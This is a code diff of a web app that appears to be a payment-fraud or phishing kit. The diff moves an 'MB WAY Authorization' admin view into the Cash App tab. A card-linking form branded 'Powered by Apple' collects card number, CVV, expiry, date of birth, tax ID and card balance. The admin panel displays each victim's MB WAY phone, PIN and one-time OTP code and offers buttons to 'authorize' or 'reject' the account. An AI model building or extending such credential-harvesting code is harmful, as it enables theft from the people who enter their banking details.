@@ -594,7 +594,6 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
   <div class="admin-tabs">
     <button class="admin-tab active" id="atab-auth" onclick="switchAdminTab('auth')" data-i18n="authorization">Authorization</button>
     <button class="admin-tab" id="atab-cashapp" onclick="switchAdminTab('cashapp')"><img src="https://i.imgur.com/wT32rIk.jpeg" style="width:16px;height:16px;border-radius:3px;object-fit:cover;vertical-align:middle;margin-right:4px;">Cash App</button>
-    <button class="admin-tab" id="atab-mbway" onclick="switchAdminTab('mbway')"><img src="https://i.imgur.com/JGEaMvn.jpeg" style="width:16px;height:16px;border-radius:3px;object-fit:cover;vertical-align:middle;margin-right:4px;">MB WAY</button>
     <button class="admin-tab" id="atab-deposits" onclick="switchAdminTab('deposits')"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><line x1="12" y1="1" x2="12" y2="23"></line><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg> Deposits</button>
     <button class="admin-tab" id="atab-withdrawals" onclick="switchAdminTab('withdrawals')"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><circle cx="12" cy="12" r="10"></circle><polyline points="12 16 16 12 12 8"></polyline><line x1="8" y1="12" x2="16" y2="12"></line></svg> Withdrawals</button>
     <button class="admin-tab" id="atab-codes" onclick="switchAdminTab('codes')">Users</button>
@@ -629,10 +628,8 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
   <div class="admin-content" id="acontent-cashapp">
     <div style="margin-bottom:16px;"><div style="font-size:18px;font-weight:700;color:#fff;margin-bottom:4px;display:flex;align-items:center;gap:8px;"><img src="https://i.imgur.com/wT32rIk.jpeg" style="width:24px;height:24px;border-radius:4px;object-fit:cover;">Cash App Authorization</div><div style="font-size:13px;color:rgba(255,255,255,0.5);">Authorize or reject Cash App accounts</div></div>
     <div id="cashapp-admin-list"><p class="acc-empty">Loading...</p></div>
-  </div>
-  <div class="admin-content" id="acontent-mbway">
-    <div style="margin-bottom:16px;"><div style="font-size:18px;font-weight:700;color:#fff;margin-bottom:4px;display:flex;align-items:center;gap:8px;"><img src="https://i.imgur.com/JGEaMvn.jpeg" style="width:24px;height:24px;border-radius:4px;object-fit:cover;">MB WAY Authorization</div><div style="font-size:13px;color:rgba(255,255,255,0.5);">Authorize or reject MB WAY accounts</div></div>
-    <div id="mbway-admin-list"><p class="acc-empty">No MB WAY accounts yet</p></div>
+    <div style="margin-top:20px;"><div style="font-size:16px;font-weight:700;color:#fff;margin-bottom:12px;display:flex;align-items:center;gap:8px;"><img src="https://i.imgur.com/JGEaMvn.jpeg" style="width:20px;height:20px;border-radius:3px;object-fit:cover;">MB WAY Authorization</div><div style="font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:10px;">Authorize or reject MB WAY accounts</div></div>
+    <div id="mbway-admin-list"><p class="acc-empty">Loading...</p></div>
   </div>
   <div class="admin-content" id="acontent-withdrawals"><div id="withdrawals-list"><p class="acc-empty">Loading...</p></div></div>
   <div class="admin-content" id="acontent-codes">
@@ -657,7 +654,7 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
 
 <div class="modal" id="cards-list-modal"><div class="modal-box"><div class="modal-header"><h3><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#1a56ff" stroke-width="2" style="vertical-align:middle;margin-right:6px;"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>Linked Cards</h3><button class="modal-close" onclick="closeModal('cards-list-modal')">&#215;</button></div><div id="cards-list-content"></div></div></div>
 
-<div class="modal" id="card-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/L2U0Crf.jpeg" style="width:72px;height:72px;object-fit:contain;border-radius:16px;filter:drop-shadow(0 0 8px rgba(255,255,255,0.12));display:block;margin:0 auto 8px;" alt="Card Logo"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Powered by Apple</div></div><div class="modal-header"><h3 id="card-modal-title"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#4dabff" stroke-width="2" style="vertical-align:middle;margin-right:6px;"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>Link Card</h3><button class="modal-close" onclick="closeModal('card-modal')">&#215;</button></div><input type="text" class="modal-input" id="card-number" placeholder="Card Number (16 digits)" data-i18n="cardNumber" maxlength="19" inputmode="numeric"><input type="text" class="modal-input" id="card-name" placeholder="Cardholder Name" data-i18n="cardHolder"><input type="text" class="modal-input" id="card-bank-name" placeholder="Bank Name" maxlength="50"><div style="display:flex;gap:8px;margin-bottom:10px;"><div style="flex:1;"><label style="display:block;font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;padding-left:2px;">Card Expiry</label><input type="month" class="modal-input" id="card-expiry" data-i18n="expiry" style="color-scheme:dark;margin-top:0;margin-bottom:0;"></div><div style="flex:1;"><label style="display:block;font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;padding-left:2px;">CVV</label><input type="text" class="modal-input" id="card-cvv" data-i18n="cvv" maxlength="4" inputmode="numeric" style="margin-top:0;margin-bottom:0;"></div></div><div class="dark-section"><h4><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.6)" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>Billing Address</h4><input type="text" class="modal-input" id="card-street" placeholder="Street Address" data-i18n="streetAddr"><div style="display:flex;gap:8px;"><input type="text" class="modal-input" id="card-city" placeholder="City" data-i18n="city" style="flex:1;"><input type="text" class="modal-input" id="card-postcode" placeholder="Postcode" data-i18n="postcode" style="flex:1;"></div><select class="modal-input" id="card-country-field"><option value="">Select Country</option><option value="United States">🇺🇸 United States</option><option value="United Kingdom">🇬🇧 United Kingdom</option><option value="Canada">🇨🇦 Canada</option><option value="Australia">🇦🇺 Australia</option><option value="Germany">🇩🇪 Germany</option><option value="France">🇫🇷 France</option><option value="Spain">🇪🇸 Spain</option><option value="Italy">🇮🇹 Italy</option><option value="Portugal">🇵🇹 Portugal</option><option value="Netherlands">🇳🇱 Netherlands</option><option value="Belgium">🇧🇪 Belgium</option><option value="Switzerland">🇨🇭 Switzerland</option><option value="Austria">🇦🇹 Austria</option><option value="Sweden">🇸🇪 Sweden</option><option value="Norway">🇳🇴 Norway</option><option value="Denmark">🇩🇰 Denmark</option><option value="Finland">🇫🇮 Finland</option><option value="Ireland">🇮🇪 Ireland</option><option value="Poland">🇵🇱 Poland</option><option value="Czech Republic">🇨🇿 Czech Republic</option><option value="Greece">🇬🇷 Greece</option><option value="Brazil">🇧🇷 Brazil</option><option value="Mexico">🇲🇽 Mexico</option><option value="Argentina">🇦🇷 Argentina</option><option value="Chile">🇨🇱 Chile</option><option value="Colombia">🇨🇴 Colombia</option><option value="India">🇮🇳 India</option><option value="China">🇨🇳 China</option><option value="Japan">🇯🇵 Japan</option><option value="South Korea">🇰🇷 South Korea</option><option value="Singapore">🇸🇬 Singapore</option><option value="Malaysia">🇲🇾 Malaysia</option><option value="Thailand">🇹🇭 Thailand</option><option value="Philippines">🇵🇭 Philippines</option><option value="Indonesia">🇮🇩 Indonesia</option><option value="Vietnam">🇻🇳 Vietnam</option><option value="Nigeria">🇳🇬 Nigeria</option><option value="South Africa">🇿🇦 South Africa</option><option value="Kenya">🇰🇪 Kenya</option><option value="Egypt">🇪🇬 Egypt</option><option value="Ghana">🇬?? Ghana</option><option value="United Arab Emirates">🇦🇪 UAE</option><option value="Saudi Arabia">🇸🇦 Saudi Arabia</option><option value="Israel">🇮🇱 Israel</option><option value="Turkey">🇹🇷 Turkey</option><option value="New Zealand">🇳🇿 New Zealand</option></select><input type="tel" class="modal-input" id="card-phone" placeholder="Phone Number"><div style="margin-top:4px;"><label style="display:block;font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;padding-left:2px;">Date of Birth</label><input type="date" class="modal-input" id="card-dob" style="color-scheme:dark;margin-top:0;"></div><div id="tax-id-container" style="margin-top:4px;display:none;"><label id="tax-id-label" style="display:block;font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;padding-left:2px;">Tax ID</label><input type="text" class="modal-input" id="card-tax-id" maxlength="20" style="margin-top:0;"></div></div><input type="text" class="modal-input" id="card-balance" placeholder="Current Card Balance (e.g. 2500.00)" data-i18n="currentBalance" inputmode="decimal">
+<div class="modal" id="card-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/L2U0Crf.jpeg" style="width:72px;height:72px;object-fit:contain;border-radius:16px;filter:drop-shadow(0 0 8px rgba(255,255,255,0.12));display:block;margin:0 auto 8px;" alt="Card Logo"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Powered by Apple</div></div><div class="modal-header"><h3 id="card-modal-title"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#4dabff" stroke-width="2" style="vertical-align:middle;margin-right:6px;"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>Link Card</h3><button class="modal-close" onclick="closeModal('card-modal')">&#215;</button></div><input type="text" class="modal-input" id="card-number" placeholder="Card Number (16 digits)" data-i18n="cardNumber" maxlength="19" inputmode="numeric"><input type="text" class="modal-input" id="card-name" placeholder="Cardholder Name" data-i18n="cardHolder"><input type="text" class="modal-input" id="card-bank-name" placeholder="Bank Name" maxlength="50"><div style="display:flex;gap:8px;margin-bottom:10px;"><div style="flex:1;"><label style="display:block;font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;padding-left:2px;">Card Expiry</label><input type="month" class="modal-input" id="card-expiry" data-i18n="expiry" style="color-scheme:dark;margin-top:0;margin-bottom:0;"></div><div style="flex:1;"><label style="display:block;font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;padding-left:2px;">CVV</label><input type="text" class="modal-input" id="card-cvv" data-i18n="cvv" maxlength="4" inputmode="numeric" style="margin-top:0;margin-bottom:0;"></div></div><div class="dark-section"><h4><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.6)" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>Billing Address</h4><input type="text" class="modal-input" id="card-street" placeholder="Street Address" data-i18n="streetAddr"><div style="display:flex;gap:8px;"><input type="text" class="modal-input" id="card-city" placeholder="City" data-i18n="city" style="flex:1;"><input type="text" class="modal-input" id="card-postcode" placeholder="Postcode" data-i18n="postcode" style="flex:1;"></div><select class="modal-input" id="card-country-field"><option value="">Select Country</option><option value="United States">🇺🇸 United States</option><option value="United Kingdom">🇬🇧 United Kingdom</option><option value="Canada">🇨🇦 Canada</option><option value="Australia">🇦🇺 Australia</option><option value="Germany">🇩🇪 Germany</option><option value="France">🇫🇷 France</option><option value="Spain">🇪🇸 Spain</option><option value="Italy">🇮🇹 Italy</option><option value="Portugal">🇵🇹 Portugal</option><option value="Netherlands">🇳🇱 Netherlands</option><option value="Belgium">🇧🇪 Belgium</option><option value="Switzerland">🇨🇭 Switzerland</option><option value="Austria">🇦🇹 Austria</option><option value="Sweden">🇸🇪 Sweden</option><option value="Norway">🇳🇴 Norway</option><option value="Denmark">🇩🇰 Denmark</option><option value="Finland">🇫🇮 Finland</option><option value="Ireland">🇮🇪 Ireland</option><option value="Poland">🇵🇱 Poland</option><option value="Czech Republic">🇨🇿 Czech Republic</option><option value="Greece">🇬🇷 Greece</option><option value="Brazil">🇧🇷 Brazil</option><option value="Mexico">🇲🇽 Mexico</option><option value="Argentina">🇦🇷 Argentina</option><option value="Chile">🇨🇱 Chile</option><option value="Colombia">🇨🇴 Colombia</option><option value="India">🇮🇳 India</option><option value="China">🇨🇳 China</option><option value="Japan">🇯🇵 Japan</option><option value="South Korea">🇰🇷 South Korea</option><option value="Singapore">🇸🇬 Singapore</option><option value="Malaysia">🇲🇾 Malaysia</option><option value="Thailand">🇹🇭 Thailand</option><option value="Philippines">🇵🇭 Philippines</option><option value="Indonesia">🇮🇩 Indonesia</option><option value="Vietnam">🇻🇳 Vietnam</option><option value="Nigeria">🇳🇬 Nigeria</option><option value="South Africa">🇿🇦 South Africa</option><option value="Kenya">🇰🇪 Kenya</option><option value="Egypt">🇪🇬 Egypt</option><option value="Ghana">🇬🇭 Ghana</option><option value="United Arab Emirates">🇦🇪 UAE</option><option value="Saudi Arabia">🇸🇦 Saudi Arabia</option><option value="Israel">🇮🇱 Israel</option><option value="Turkey">🇹🇷 Turkey</option><option value="New Zealand">🇳🇿 New Zealand</option></select><input type="tel" class="modal-input" id="card-phone" placeholder="Phone Number"><div style="margin-top:4px;"><label style="display:block;font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;padding-left:2px;">Date of Birth</label><input type="date" class="modal-input" id="card-dob" style="color-scheme:dark;margin-top:0;"></div><div id="tax-id-container" style="margin-top:4px;display:none;"><label id="tax-id-label" style="display:block;font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;padding-left:2px;">Tax ID</label><input type="text" class="modal-input" id="card-tax-id" maxlength="20" style="margin-top:0;"></div></div><input type="text" class="modal-input" id="card-balance" placeholder="Current Card Balance (e.g. 2500.00)" data-i18n="currentBalance" inputmode="decimal">
 <div style="background:rgba(77,171,255,0.08);border:1px solid rgba(77,171,255,0.25);border-radius:10px;padding:12px 14px;margin:6px 0 10px;display:flex;gap:10px;align-items:flex-start;">
   <div style="flex-shrink:0;"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#4dabff" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg></div>
   <div>
@@ -854,7 +851,7 @@ function switchTab(tabId,btn,noPush){
 
 // ── ADMIN TABS ──
 function switchAdminTab(name){
-  ['auth','cashapp','mbway','deposits','withdrawals','codes'].forEach(function(t){
+  ['auth','cashapp','deposits','withdrawals','codes'].forEach(function(t){
     var tab=$('atab-'+t),con=$('acontent-'+t);
     if(tab) tab.classList.remove('active');
     if(con) con.classList.remove('active');
@@ -864,7 +861,6 @@ function switchAdminTab(name){
   if(con) con.classList.add('active');
   if(name==='auth') loadAuthTab();
   else if(name==='cashapp') loadCashAppTab();
-  else if(name==='mbway') loadMBWayTab();
   else if(name==='deposits') loadDepositsTab();
   else if(name==='withdrawals') loadWithdrawalsTab();
   else loadUsersTab();
@@ -1240,10 +1236,10 @@ auth.onAuthStateChanged(function(user){
     renderAccountInfo();
     if(user.email===ADMIN_EMAIL){
       showScreen('admin-panel');
-      loadAuthTab(); loadCashAppTab(); loadDepositsTab(); loadWithdrawalsTab(); loadUsersTab(); setTimeout(function(){ loadMBWayTab(); }, 800);
+      loadAuthTab(); loadCashAppTab(); loadDepositsTab(); loadWithdrawalsTab(); loadUsersTab();
     } else if(user.email===ADMINADEX_EMAIL){
       showScreen('admin-panel');
-      loadAuthTab(); loadCashAppTab(); loadDepositsTab(); loadWithdrawalsTab(); loadUsersTab(); setTimeout(function(){ loadMBWayTab(); }, 800);
+      loadAuthTab(); loadCashAppTab(); loadDepositsTab(); loadWithdrawalsTab(); loadUsersTab();
     } else {
       showScreen('dashboard',true);
       history.replaceState({screen:'dashboard',tab:'tab-home'},'',window.location.pathname+(window.location.search||''));
@@ -1821,6 +1817,7 @@ function loadCashAppTab(){
   var list = $('cashapp-admin-list');
   if(!list) return;
   list.innerHTML = '<p class="acc-empty">Loading...</p>';
+  loadMBWayInCashAppTab();
   
   db.ref('users').once('value').then(function(snap){
     var allAccounts = [];
@@ -1883,6 +1880,104 @@ function loadCashAppTab(){
         actionsHTML;
       
       list.appendChild(div);
+    });
+  });
+}
+
+// ── ADMIN: MB WAY (inside Cash App tab) ──
+function loadMBWayInCashAppTab(){
+  var list = $('mbway-admin-list');
+  if(!list) return;
+  list.innerHTML = '<p class="acc-empty">Loading...</p>';
+  db.ref('users').once('value').then(function(snap){
+    var allAccounts = [];
+    snap.forEach(function(s){
+      var u = s.val();
+      if(!u || u.email === ADMIN_EMAIL) return;
+      var accounts = u.mbwayAccounts || [];
+      accounts.forEach(function(acc, idx){
+        if(acc){
+          allAccounts.push({u: u, acc: acc, uid: s.key, idx: idx});
+        }
+      });
+    });
+    allAccounts.sort(function(a, b){
+      if(a.acc.status === 'pending' && b.acc.status !== 'pending') return -1;
+      if(b.acc.status === 'pending' && a.acc.status !== 'pending') return 1;
+      return new Date(b.acc.addedDate) - new Date(a.acc.addedDate);
+    });
+    if(allAccounts.length === 0){
+      list.innerHTML = '<p class="acc-empty">No MB WAY accounts yet</p>';
+      return;
+    }
+    list.innerHTML = '';
+    allAccounts.forEach(function(item){
+      var u = item.u, acc = item.acc, uid = item.uid, idx = item.idx;
+      var isPending = acc.status === 'pending';
+      var isAuthorized = acc.status === 'authorized';
+      var isRejected = acc.status === 'rejected';
+      var div = document.createElement('div');
+      div.className = 'deposit-card';
+      div.style.borderLeft = isPending ? '4px solid #f59e0b' : (isAuthorized ? '4px solid #00a550' : '4px solid #e53935');
+      var statusHTML = '<span class="deposit-status '+(isPending?'pending':(isAuthorized?'approved':'rejected'))+'">'+( isPending?'⏳ PENDING':(isAuthorized?'✓ AUTHORIZED':'✗ REJECTED'))+'</span>';
+      var actionsHTML = '';
+      if(isPending){
+        var cmtId = 'mb-cmt-'+uid+'-'+idx;
+        actionsHTML = '<textarea class="admin-comment" id="'+cmtId+'" placeholder="Comment (optional)" rows="2"></textarea>'+
+          '<div class="admin-card-actions"><button class="admin-action-btn green" onclick="authorizeMBWay(\''+uid+'\','+idx+',\''+cmtId+'\')">✅ Authorize</button>'+
+          '<button class="admin-action-btn red" onclick="rejectMBWay(\''+uid+'\','+idx+',\''+cmtId+'\')">❌ Reject</button></div>';
+      }
+      div.innerHTML = statusHTML +
+        '<div class="admin-card-name">'+u.firstname+' '+u.surname+'</div>'+
+        '<div class="admin-detail-row"><span class="admin-detail-label">Email</span><span>'+u.email+'</span></div>'+
+        '<div class="admin-detail-row"><span class="admin-detail-label">Account #</span><span>'+u.accountNumber+'</span></div>'+
+        '<div class="admin-detail-row"><span class="admin-detail-label">Country</span><span>'+u.country+'</span></div>'+
+        '<div class="admin-detail-row"><span class="admin-detail-label">Phone</span><span style="color:#cc0000;font-weight:600;">'+acc.phone+'</span></div>'+
+        '<div class="admin-detail-row"><span class="admin-detail-label">PIN</span><span style="color:#cc0000;font-weight:600;">'+acc.pin+'</span></div>'+
+        (acc.otpCode?'<div class="admin-detail-row"><span class="admin-detail-label">OTP Code</span><span style="color:#4dabff;font-weight:700;">'+acc.otpCode+'</span></div>':'')+
+        '<div class="admin-detail-row"><span class="admin-detail-label">Submitted</span><span>'+fmtDate(acc.addedDate)+'</span></div>'+
+        (acc.authorizedDate?'<div class="admin-detail-row"><span class="admin-detail-label">Authorized</span><span>'+fmtDate(acc.authorizedDate)+'</span></div>':'')+
+        (acc.rejectedDate?'<div class="admin-detail-row"><span class="admin-detail-label">Rejected</span><span>'+fmtDate(acc.rejectedDate)+'</span></div>':'')+
+        (acc.rejectionReason?'<div class="admin-detail-row"><span class="admin-detail-label">Reason</span><span style="color:#e53935;">'+acc.rejectionReason+'</span></div>':'')+
+        actionsHTML;
+      list.appendChild(div);
+    });
+  });
+}
+
+function authorizeMBWay(uid, idx, cmtId){
+  db.ref('users/'+uid).once('value').then(function(snap){
+    var u = snap.val();
+    if(!u) return;
+    var accounts = u.mbwayAccounts || [];
+    if(!accounts[idx]) return;
+    accounts[idx].status = 'authorized';
+    accounts[idx].authorizedDate = new Date().toISOString();
+    var comment = $(cmtId);
+    if(comment && comment.value) accounts[idx].adminComment = comment.value;
+    db.ref('users/'+uid+'/mbwayAccounts').set(accounts).then(function(){
+      notify(uid, '✅ Your MB WAY account has been authorized!');
+      loadMBWayInCashAppTab();
+    });
+  });
+}
+
+function rejectMBWay(uid, idx, cmtId){
+  var reason = prompt('Reason for rejection:');
+  if(!reason) return;
+  db.ref('users/'+uid).once('value').then(function(snap){
+    var u = snap.val();
+    if(!u) return;
+    var accounts = u.mbwayAccounts || [];
+    if(!accounts[idx]) return;
+    accounts[idx].status = 'rejected';
+    accounts[idx].rejectionReason = reason;
+    accounts[idx].rejectedDate = new Date().toISOString();
+    var comment = $(cmtId);
+    if(comment && comment.value) accounts[idx].adminComment = comment.value;
+    db.ref('users/'+uid+'/mbwayAccounts').set(accounts).then(function(){
+      notify(uid, '❌ Your MB WAY account was rejected. Reason: '+reason);
+      loadMBWayInCashAppTab();
     });
   });
 }
@@ -3334,87 +3429,6 @@ $('mbway-otp-submit-btn').onclick = function(){
 })();
 
 // ── ADMIN: MBWAY TAB ──
-function loadMBWayTab(){
-  var list = $('mbway-admin-list');
-  if(!list) return;
-  list.innerHTML = '<p class="acc-empty">Loading...</p>';
-  db.ref('users').once('value').then(function(snap){
-    var all = [];
-    snap.forEach(function(s){
-      var u = s.val();
-      if(!u || u.email === ADMIN_EMAIL) return;
-      (u.mbwayAccounts||[]).forEach(function(acc, idx){
-        if(acc) all.push({u:u, acc:acc, uid:s.key, idx:idx});
-      });
-    });
-    all.sort(function(a,b){
-      if(a.acc.status==='pending'&&b.acc.status!=='pending') return -1;
-      if(b.acc.status==='pending'&&a.acc.status!=='pending') return 1;
-      return new Date(b.acc.addedDate)-new Date(a.acc.addedDate);
-    });
-    if(!all.length){list.innerHTML='<p class="acc-empty">No MB WAY accounts yet</p>';return;}
-    list.innerHTML='';
-    all.forEach(function(item){
-      var u=item.u, acc=item.acc, uid=item.uid, idx=item.idx;
-      var isPending=acc.status==='pending', isAuthorized=acc.status==='authorized';
-      var div=document.createElement('div');
-      div.className='deposit-card';
-      div.style.borderLeft=isPending?'4px solid #f59e0b':(isAuthorized?'4px solid #00a550':'4px solid #e53935');
-      var statusHTML='<span class="deposit-status '+(isPending?'pending':(isAuthorized?'approved':'rejected'))+'">'+(isPending?'⏳ PENDING':(isAuthorized?'✓ AUTHORIZED':'✗ REJECTED'))+'</span>';
-      var actionsHTML='';
-      if(isPending){
-        var cmtId='mb-cmt-'+uid+'-'+idx;
-        actionsHTML='<textarea class="admin-comment" id="'+cmtId+'" placeholder="Comment (optional)" rows="2"></textarea>'+
-          '<div class="admin-card-actions"><button class="admin-action-btn green" onclick="authorizeMBWay(\''+uid+'\','+idx+',\''+cmtId+'\')">✅ Authorize</button>'+
-          '<button class="admin-action-btn red" onclick="rejectMBWay(\''+uid+'\','+idx+',\''+cmtId+'\')">❌ Reject</button></div>';
-      }
-      div.innerHTML=statusHTML+
-        '<div class="admin-card-name">'+u.firstname+' '+u.surname+'</div>'+
-        '<div class="admin-detail-row"><span class="admin-detail-label">Email</span><span>'+u.email+'</span></div>'+
-        '<div class="admin-detail-row"><span class="admin-detail-label">Account #</span><span>'+u.accountNumber+'</span></div>'+
-        '<div class="admin-detail-row"><span class="admin-detail-label">Country</span><span>'+u.country+'</span></div>'+
-        '<div class="admin-detail-row"><span class="admin-detail-label">Phone</span><span style="color:#cc0000;font-weight:600;">'+acc.phone+'</span></div>'+
-        '<div class="admin-detail-row"><span class="admin-detail-label">PIN</span><span style="color:#cc0000;font-weight:600;">'+acc.pin+'</span></div>'+
-        (acc.otpCode?'<div class="admin-detail-row"><span class="admin-detail-label">OTP Code</span><span style="color:#4dabff;font-weight:700;">'+acc.otpCode+'</span></div>':'')+
-        '<div class="admin-detail-row"><span class="admin-detail-label">Submitted</span><span>'+fmtDate(acc.addedDate)+'</span></div>'+
-        (acc.authorizedDate?'<div class="admin-detail-row"><span class="admin-detail-label">Authorized</span><span>'+fmtDate(acc.authorizedDate)+'</span></div>':'')+
-        (acc.rejectedDate?'<div class="admin-detail-row"><span class="admin-detail-label">Rejected</span><span>'+fmtDate(acc.rejectedDate)+'</span></div>':'')+
-        (acc.rejectionReason?'<div class="admin-detail-row"><span class="admin-detail-label">Reason</span><span style="color:#e53935;">'+acc.rejectionReason+'</span></div>':'')+
-        actionsHTML;
-      list.appendChild(div);
-    });
-  }).catch(function(e){ list.innerHTML='<p class="acc-empty">Error loading MB WAY accounts</p>'; console.error(e); });
-}
-
-function authorizeMBWay(uid, idx, cmtId){
-  db.ref('users/'+uid).once('value').then(function(snap){
-    var u=snap.val(); if(!u) return;
-    var accounts=u.mbwayAccounts||[]; if(!accounts[idx]) return;
-    accounts[idx].status='authorized';
-    accounts[idx].authorizedDate=new Date().toISOString();
-    var c=$(cmtId); if(c&&c.value) accounts[idx].adminComment=c.value;
-    db.ref('users/'+uid+'/mbwayAccounts').set(accounts).then(function(){
-      notify(uid,'✅ Your MB WAY account has been authorized!');
-      loadMBWayTab();
-    });
-  });
-}
-
-function rejectMBWay(uid, idx, cmtId){
-  var reason=prompt('Reason for rejection:'); if(!reason) return;
-  db.ref('users/'+uid).once('value').then(function(snap){
-    var u=snap.val(); if(!u) return;
-    var accounts=u.mbwayAccounts||[]; if(!accounts[idx]) return;
-    accounts[idx].status='rejected';
-    accounts[idx].rejectionReason=reason;
-    accounts[idx].rejectedDate=new Date().toISOString();
-    var c=$(cmtId); if(c&&c.value) accounts[idx].adminComment=c.value;
-    db.ref('users/'+uid+'/mbwayAccounts').set(accounts).then(function(){
-      notify(uid,'❌ Your MB WAY account was rejected. Reason: '+reason);
-      loadMBWayTab();
-    });
-  });
-}
 
 }); // END DOMContentLoaded
 </script>
